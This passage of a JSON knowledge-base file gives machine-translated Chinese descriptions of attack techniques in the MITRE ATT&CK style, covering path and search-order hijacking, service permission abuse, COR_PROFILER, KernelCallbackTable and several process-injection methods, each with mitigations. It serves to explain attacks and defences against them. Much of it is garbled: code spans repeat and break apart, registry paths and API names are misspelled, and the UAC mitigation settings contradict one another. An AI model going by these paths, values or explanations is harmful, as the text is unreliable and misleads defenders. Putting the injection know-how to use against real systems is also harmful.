          "content": "当对手滥用Windows搜索未给出路径的程序的顺序时，就会发生搜索顺序劫持。与DLL搜索顺序劫持不同，搜索顺序取决于用于执行程序的方法。但是，在搜索Windows系统目录之前，Windows在启动程序的目录中搜索很常见。一个对搜索顺序劫持的程序的对手（即未指定可执行路径的程序）可以通过创建以不当指定的程序命名并将其放置在启动程序的目录中来利用此漏洞的优势来利用此漏洞。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，“ example.exe”运行命令行参数"
        },
        {
          "type": "code",
          "content": " net user "
        },
        {
          "type": "text",
          "content": "运行“ cmd.exe”。对手可以将一个名为“ net.exe”的程序放置在与示例同一目录中，“ net.exe”将运行，而不是Windows System Utility Net。另外，如果对手将一个名为“ net.com”的程序放在与“ net.exe”同一目录中“ net.exe”是由于在路径下定义的可执行扩展的顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "搜索订单劫持也是劫持DLL负载的常见做法，并在DLL搜索订单劫持中涵盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持脆弱的文件路径参考来执行自己的恶意有效载荷。对手可以通过将可执行文件放置在路径中的较高级别目录中，以利用缺乏周围报价的路径，从而使Windows选择对手的可执行文件进行启动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果路径有一个或多个空间，并且不被引号包围，那么服务路径和快捷路径也可能容易受到路径拦截的影响（例如，"
        },
        {
          "type": "code",
          "content": " c：\\ space \\ program.exe.exe.exe.exe </code.exe </code.exe </code.exe </code.exe </code </code </code </code </code.vs.“ C：\\带有Space \\ Program.exe的安全路径” "
        },
        {
          "type": "text",
          "content": "）。（存储在Windows注册表密钥中）对手可以将可执行文件放在路径的较高级别目录中，Windows将解决该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径为"
        },
        {
          "type": "code",
          "content": " c：\\ program Files \\ MyApp.exe "
        },
        {
          "type": "text",
          "content": "，对手可以在"
        },
        {
          "type": "code",
          "content": " c：\\ program.exe "
        },
        {
          "type": "text",
          "content": "中创建一个程序运行而不是预期的程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果定期调用可执行文件，则该技术可用于持久性，如果较高的特权过程启动了截距可执行文件，则可以使用特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的二进制文件来执行自己的恶意有效载荷。对手可能会在Windows服务权限中使用缺陷来替换服务开始时执行的二进制文件。这些服务过程可以自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果包含目标二进制的文件系统目录上的权限或二进制本身上的权限不正确，则可以使用用户级权限将目标二进制文件与另一个二进制文件覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的注册表条目来执行自己的恶意有效载荷。对手可能会在权限中使用与服务相关的注册表键的缺陷，以从最初指定的可执行文件重定向到他们控制的键，以便在服务启动时启动自己的代码。Windows在"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ CurrentControlset \\ Services "
        },
        {
          "type": "text",
          "content": "下，在注册表中存储本地服务配置信息。可以操纵下存储在服务注册表键下的信息，以通过服务控制器，SC.EXE，PowerShell或Reg等工具来修改服务的执行参数。通过访问控制列表和用户权限控制对注册表键的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果无法正确设置用户和组的权限，并允许访问服务注册表键，则对手可能会将服务的BinPath/ImagePath更改为指向其控件下的其他可执行文件。当服务启动或重新启动时，对手控制程序将执行，从而使对手建立持久性和/或特权升级到帐户上下文中，该服务设置为在（本地/域名，系统，System，Localservice，或Localserservice或LocalService，或网络服务）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会更改服务注册表中的其他注册表键。例如，可以更改"
        },
        {
          "type": "code",
          "content": " FailureCommand "
        },
        {
          "type": "text",
          "content": "密钥，以便在服务失败或故意损坏的任何时候在高架上下文中执行该服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": ""
        },
        {
          "type": "code",
          "content": " performance "
        },
        {
          "type": "text",
          "content": "键包含驱动程序服务dll的名称以及DLL中多个导出功能的名称。如果<Code> dermative </code>键尚未存在，并且如果对手控制的用户具有"
        },
        {
          "type": "code",
          "content": "创建子键</code "
        },
        {
          "type": "text",
          "content": "权限，则对手可能会在此处创建"
        },
        {
          "type": "code",
          "content": " performance </code </code </code "
        },
        {
          "type": "text",
          "content": "键服务的注册表树指向恶意的DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以添加"
        },
        {
          "type": "code",
          "content": "参数"
        },
        {
          "type": "text",
          "content": "密钥，该密钥存储特定于驱动程序的数据或其他自定义子键，以建立持久性或启用其他恶意活动。此外，如果对手使用svchost.exe启动其恶意服务，则可以使用"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ serviceName \\ parameters \\ parameters \\ serviceCeeders \\ servicedll </code "
        },
        {
          "type": "text",
          "content": "来识别服务的文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改可能导致特权升级的系统组件的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.012",
    "name": "COR_PROFILER",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用COR_Profiler环境变量来劫持加载.NET CLR的程序的执行流。COR_PROFILER是一个.NET框架功能，它允许开发人员指定一个未托管的（或外部的.NET）分析dll，将加载到每个.NET过程中，该进程加载了通用语言运行时（CLR）。这些探查器旨在监视，故障排除和调试由.NET CLR执行的托管代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "COR_Profiler环境变量可以在各种范围（系统，用户或过程）上设置，从而产生不同级别的影响。在注册表中指定了系统和整个用户环境变量范围，其中组件对象模型（COM）对象可以注册为Profiler dll。也可以在不修改注册表的情况下内置内存中创建过程范围cor_profiler。从.NET Framework 4开始，只要在COR_Profiler_Path环境变量中指定DLL的位置，DLL就不需要注册。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用cor_profiler建立持久性，每次调用CLR时，在所有.NET过程中都会执行恶意DLL。如果受害者.NET流程以较高的许可级别执行，以及.NET流程提供的挂钩和损害防御措施，则COR_Profiler也可用于提升特权（EX：旁路用户帐户控制）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用能够审核和/或阻止未批准的DLL的应用程序控制解决方案（例如Applocker），识别并阻止潜在的恶意无管理的COR_Profiler分析DLL。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册中心设置适当的权限，以防止用户修改与COR_Profiler相关的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，以便只有授权的管理员可以编辑系统环境变量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.013",
    "name": "KernelCallbackTable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "，以劫持其执行流程以运行自己的有效载荷。"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "可以在过程环境块（PEB）中找到，并在加载"
        },
        {
          "type": "code",
          "content": " user32.dll "
        },
        {
          "type": "text",
          "content": "后，将GUI进程可用的一系列图形功能初始化。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "劫持过程的执行流，通过用恶意有效载荷替换原始回调函数。可以通过各种方式来修改回调函数，涉及相关行为，例如反射代码加载或过程注入到另一个过程中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过找到peb（例如：通过呼叫"
        },
        {
          "type": "code",
          "content": " ntqueryInformationProcess（）"
        },
        {
          "type": "text",
          "content": " </code>本机api函数来获得"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": " </code>的指针。指针位于指针后，"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": "可以重复，并且在表中设置了一个函数（例如，"
        },
        {
          "type": "code",
          "content": " fncopydata "
        },
        {
          "type": "text",
          "content": "）设置为恶意有效载荷的地址（ex：ex：ex：fia <<代码> writeProcessMemory（）</code>）。然后，将固定在表格的新地址更新。调用篡改功能后，将触发恶意有效载荷。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常使用Windows消息调用篡改功能。劫持过程并执行恶意代码后，"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "也可以通过恶意有效载荷将其恢复为原始状态。将"
        },
        {
          "type": "code",
          "content": "内核返回"
        },
        {
          "type": "text",
          "content": "用于劫持执行流程可能会从安全产品中逃避检测，因为可以在合法的过程中掩盖执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于指示器的常见序列（例如：执行特定API函数），以阻止与过程注入/内存篡改有关的某些类型的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将动态链接库（DLL）注入过程中，以逃避基于过程的防御，并可能提高特权。DLL注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DLL注入通常是通过在目标过程的虚拟地址空间中编写通往DLL的路径，然后通过调用新线程加载DLL。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " virtualAlloCex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "）执行写入，然后用"
        },
        {
          "type": "code",
          "content": " createRemoteThread "
        },
        {
          "type": "text",
          "content": "（称为"
        },
        {
          "type": "code",
          "content": " load> loadslibrary </code </code </code "
        },
        {
          "type": "text",
          "content": "）/代码> API负责加载DLL）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该方法的变体，例如反射性DLL注入（将自映射DLL写入一个过程）和内存模块（写入进程时的MAP DLL）克服地址重定位问题以及其他API来调用执行（因为这些方法加载了加载并通过手动预定"
        },
        {
          "type": "code",
          "content": " loadLibrary "
        },
        {
          "type": "text",
          "content": "的功能来执行内存中的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该方法的另一种变体（通常称为模块踩踏/过载或DLL空心）可以在一个过程中隐藏注射的代码。此方法涉及将合法的DLL加载到远程过程中，然后在启动目标过程中的新线程之前，手动覆盖模块的"
        },
        {
          "type": "code",
          "content": " addressofentrypoint "
        },
        {
          "type": "text",
          "content": "。这种变化使攻击者可以通过在磁盘上使用合法的DLL文件来备份其执行，从而隐藏了恶意注射的代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过DLL注入执行还可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.002",
    "name": "Portable Executable Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将便携式可执行文件（PE）注入流程中，以逃避基于过程的防御以及可能提高特权。PE注射是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PE注射通常是通过将代码（可能没有磁盘上的文件）复制到目标过程的虚拟地址空间中来执行的，然后再通过新线程调用。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " virtualAlloCex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "）执行写入，然后使用"
        },
        {
          "type": "code",
          "content": " createRemoteThread "
        },
        {
          "type": "text",
          "content": "或其他代码（ex：ex：ex shellCode）调用。注射代码的位移确实引入了功能重新启动内存引用的其他要求。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PE注射执行还可以从安全产品中逃避检测，因为在合法过程中掩盖了执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.003",
    "name": "Thread Execution Hijacking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意代码注入被劫持的过程中，以逃避基于过程的防御，并可能提高特权。线程执行劫持是一种在单独的实时过程的地址空间中执行任意代码的方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "线程执行劫持通常是通过暂停现有进程然后拆卸/空心内存来执行的，然后可以将其替换为恶意代码或通往DLL的路径。首先使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " openthread "
        },
        {
          "type": "text",
          "content": "）创建了现有受害者过程的句柄。此时，可以将过程暂停，然后将其写入，重新调整到注入的代码，并通过"
        },
        {
          "type": "code",
          "content": " suppendThread "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " virtualalloolocex "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " writeprocessmemory "
        },
        {
          "type": "text",
          "content": "，<code "
        },
        {
          "type": "code",
          "content": "> setThreadContext "
        },
        {
          "type": "text",
          "content": "，然后分别"
        },
        {
          "type": "code",
          "content": " RESUMETHREAD "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这与过程中空非常相似，但针对现有过程，而不是以悬浮状态创建过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过线程执行劫持的执行也可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.004",
    "name": "Asynchronous Procedure Call",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过异步程序调用（APC）队列将恶意代码注入过程中，以逃避基于过程的防御以及可能提高特权。APC注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "APC注入通常是通过将恶意代码附加到过程线程的APC队列中执行的。当线程输入可更换状态时，将执行排队的APC功能。首先使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " openthread "
        },
        {
          "type": "text",
          "content": "）创建了现有受害者过程的句柄。此时，"
        },
        {
          "type": "code",
          "content": " queueuserapc "
        },
        {
          "type": "text",
          "content": "可以用于调用功能（例如"
        },
        {
          "type": "code",
          "content": " loadlibraya "
        },
        {
          "type": "text",
          "content": "指向恶意DLL）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "APC注入的一种被称为“早鸟注射”的变体涉及创建一个悬浮过程，在该过程中，可以在过程中编写和执行恶意代码，并通过APC在过程'入口点（可能是后来的反恶意钩）。ATOMBOMBING是另一种使用APC来调用先前写入全球原子表的恶意代码的变体。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过APC注入执行还可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.005",
    "name": "Thread Local Storage",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过线程本地存储（TLS）回调将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。TLS回调注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "TLS回调注入涉及在可执行（PE）内操纵指针，以将过程重定向到恶意代码，然后再达到该代码的合法入口点。OS通常使用TLS回调来设置和/或线程使用的清理数据。操纵TLS回调可以通过使用其他进程注入技术（例如过程挖空）在过程的内存空间内分配和写入过程中的特定偏移来执行回调。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过TLS回调注入执行还可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.008",
    "name": "Ptrace System Calls",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过PTRACE（过程跟踪）系统调用将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。PTRACE系统调用注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PTRACE系统调用注入涉及附加并修改运行过程。PTRACE系统调用使调试过程可以观察和控制另一个过程（以及每个单独的线程），包括更改内存和寄存器值。PTRACE系统调用注入通常是通过将任意代码写入运行过程（例如："
        },
        {
          "type": "code",
          "content": " malloc "
        },
        {
          "type": "text",
          "content": "），然后使用"
        },
        {
          "type": "code",
          "content": " ptrace_setregs "
        },
        {
          "type": "text",
          "content": "来设置包含下一个指令的寄存器以执行执行的寄存器来执行该内存。PTRACE系统调用注入也可以使用"
        },
        {
          "type": "code",
          "content": " ptrace_poketext "
        },
        {
          "type": "text",
          "content": "/"
        },
        {
          "type": "code",
          "content": " ptrace_pokedata "
        },
        {
          "type": "text",
          "content": "将数据复制到目标过程内存中的特定地址（例如：下一个指令的当前地址））。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PTRACE系统调用注入可能是非儿童过程和/或具有更高特权的目标过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PTRACE系统呼叫注入执行还可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "利用YAMA（ex/proc/proc/sys/kernel/yama/ptrace_scope）来减轻基于PTRACE的过程注入，仅限于仅将PTRACE使用用于特权用户。其他缓解控制措施涉及部署安全内核模块，这些模块提供了高级访问控制和流程限制，例如Selinux，Grsecurity和Apparmor。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.009",
    "name": "Proc Memory",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过 /PROC文件系统将恶意代码注入过程中，以逃避基于过程的防御以及可能提高特权。Proc内存注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PROC内存注入涉及通过/proc文件系统（"
        },
        {
          "type": "code",
          "content": "/proc/[pid] "
        },
        {
          "type": "text",
          "content": "）枚举过程的内存，然后用可用的小工具/说明来制定面向返回的编程（ROP）有效负载。每个运行过程都有自己的目录，其中包括内存映射。PROC内存注入通常是通过使用 /proc文件系统提供的内存映射覆盖目标进程的堆栈来执行的。这些信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意有效载荷的说明），否则是由过程内存保护所隐藏的，例如地址空间布局随机化（ASLR）。列举后，可以使用dd覆盖目标进程的内存映射"
        },
        {
          "type": "code",
          "content": "/proc/[pid]/maps "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "其他技术（例如动态链接器劫持措施）可以使用更多可用小工具来填充目标过程。类似于过程挖空，PROC记忆注入可能针对儿童过程（例如睡眠的背景副本）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PROC内存注入执行也可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制敏感文件上的权限，例如"
            },
            {
              "type": "code",
              "content": "/proc/[pid]/maps "
            },
            {
              "type": "text",
              "content": "或"
            },
            {
              "type": "code",
              "content": "/proc/[pid]/mem "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.011",
    "name": "Extra Window Memory Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
